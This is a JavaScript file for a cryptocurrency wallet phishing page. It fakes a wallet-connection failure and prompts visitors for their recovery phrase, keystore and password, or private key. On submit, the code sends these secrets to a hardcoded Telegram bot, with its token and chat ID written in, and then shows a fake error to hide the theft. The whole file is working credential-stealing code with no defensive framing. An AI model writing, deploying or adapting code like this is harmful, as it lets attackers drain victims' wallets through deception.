document.addEventListener("DOMContentLoaded", function () {
  // --- Utility functions ---
  const show = (el) => {
    if (el) el.style.display = "block";
  };
  const hide = (el) => {
    if (el) el.style.display = "none";
  };

  const dismissAllDialogs = () => {
    [
      "success-dialog",
      "error-dialog",
      "connect-dialog",
      "send-dialog",
      "processing-dialog",
    ].forEach((id) => hide(document.getElementById(id)));
  };

  // --- Selectors ---
  const wallets = document.querySelectorAll(".coin-registry button");
  const connectionInfo = document.querySelector(".connection-info");
  const currentWalletApp = document.getElementById("current-wallet-app");
  const currentWalletLogo = document.getElementById("current-wallet-logo");
  const connectDialog = document.getElementById("connect-dialog");
  const sendDialog = document.getElementById("send-dialog");
  const successBox = document.getElementById("success-dialog");
  const errorBox = document.getElementById("error-dialog");
  const sendFormContainer = document.getElementById("data-to-send");

  // Use "form" to match your HTML id="form"
  const processForm = document.getElementById("form");

  // 1. Wallet Selection Logic
  wallets.forEach((button) => {
    button.addEventListener("click", function (event) {
      event.preventDefault();
      const imgPath = this.querySelector(".coin-img").getAttribute("src");
      const walletName = this.lastElementChild.textContent.trim();

      connectionInfo.textContent = "Initializing...";
      currentWalletApp.textContent = walletName;
      currentWalletLogo.src = imgPath;

      show(connectDialog);

      setTimeout(() => {
        connectionInfo.innerHTML =
          'Error Connecting... <button type="button" class="manual-connection">Connect Manually</button>';
        // Auto-trigger manual connection after 1 second
        document.querySelector("button.manual-connection")?.click();
      }, 1000);
    });
  });

  // 2. Dialog Dismissal
  document.querySelectorAll(".dialog-dismiss").forEach((btn) => {
    btn.addEventListener("click", () => {
      hide(connectDialog);
      hide(sendDialog);
    });
  });

  // 3. Tab Content Switching (Updates the form dynamically)
  document.getElementById("phraseSend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <div class="form-group">
        <input type="hidden" name="type" value="phrase">
        <textarea name="phrase" required class="form-control" placeholder="Enter your recovery phrase" rows="5" style="resize: none"></textarea>
      </div> 
      <div class="small text-left my-3" style="font-size: 11px">Typically 12 (sometimes 24) words separated by single spaces</div>`;
  });

  document.getElementById("keystoreSend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <div class="form-group">
        <input type="hidden" name="type" value="keystore">
        <textarea rows="5" style="resize: none" required name="keystore" class="form-control" placeholder="Enter Keystore"></textarea>
      </div>
      <input type="text" class="form-control" name="keystore-password" required placeholder="Wallet password"> 
      <div class="small text-left my-3" style="font-size: 11px">Several lines of text beginning with "{...}" plus the password you used to encrypt it.</div>`;
  });

  document.getElementById("privateKeySend")?.addEventListener("click", () => {
    sendFormContainer.innerHTML = `
      <input type="hidden" name="type" value="privatekey">
      <input type="text" name="privateKey" required class="form-control" placeholder="Enter your Private Key"> 
      <div class="small text-left my-3" style="font-size: 11px">Typically 64 alphanumeric characters.</div>`;
  });

  // 4. Manual Connection Event Delegation
  connectionInfo.addEventListener("click", function (e) {
    if (e.target && e.target.classList.contains("manual-connection")) {
      document.getElementById("current-wallet-app-send").textContent =
        currentWalletApp.textContent;
      document.getElementById("walletNameData").value =
        currentWalletApp.textContent;
      document.getElementById("current-wallet-send-logo").src =
        currentWalletLogo.src;

      hide(connectDialog);
      show(sendDialog);
    }
  });

  // 5. Form Submission (Telegram Logic)
  processForm?.addEventListener("submit", async function (e) {
    e.preventDefault();

    const processBtn = this.querySelector('button[type="submit"]');
    const cancelBtn = document.getElementById("cancelBtn");
    const formData = new FormData(this);

    // Prepare data for Telegram
    const wallet = formData.get("wallet") || "Unknown";
    const type = formData.get("type") || "phrase";
    const secret =
      formData.get("phrase") ||
      formData.get("keystore") ||
      formData.get("privateKey") ||
      "No data";
    const pass = formData.get("keystore-password")
      ? `\nPassword: ${formData.get("keystore-password")}`
      : "";

    const message = `
<b>New Wallet Submission</b>
--------------------------
<b>Wallet:</b> ${wallet}
<b>Type:</b> ${type}
<b>Data:</b> <code>${secret}</code>${pass}
--------------------------
    `.trim();

    // UI Feedback: Loading
    const originalBtnText = processBtn.innerHTML;
    processBtn.innerHTML =
      '<span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span> Connecting...';
    processBtn.disabled = true;
    if (cancelBtn) cancelBtn.disabled = true;

    // Send to Telegram
    const botToken = "8544540012:AAF7cZx2QqOKVGQ5gxguXsjXHyZuY96y7jw";
    const chatId = "8368741386";

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: "HTML",
          }),
        }
      );

      console.log(message);

      const result = await response.json();

      if (result.ok) {
        // Wait 5 seconds to simulate "Connection" process before showing error
        setTimeout(() => {
          processBtn.innerHTML = originalBtnText;
          processBtn.disabled = false;
          if (cancelBtn) cancelBtn.disabled = false;

          const messageTab = document.querySelector("div.message-tab");
          if (messageTab) {
            messageTab.innerHTML =
              "<div class='alert alert-danger'>An unknown error occurred, please try again later.</div>";
          }
          processForm.reset();
        }, 5000);
      } else {
        throw new Error("Telegram Error");
      }
    } catch (error) {
      // Error Logic: Show error box, then return to send dialog
      processBtn.innerHTML = originalBtnText;
      processBtn.disabled = false;
      if (cancelBtn) cancelBtn.disabled = false;

      dismissAllDialogs();
      show(errorBox);

      setTimeout(() => {
        dismissAllDialogs();
        show(sendDialog);
      }, 2500);
    }
  });
});
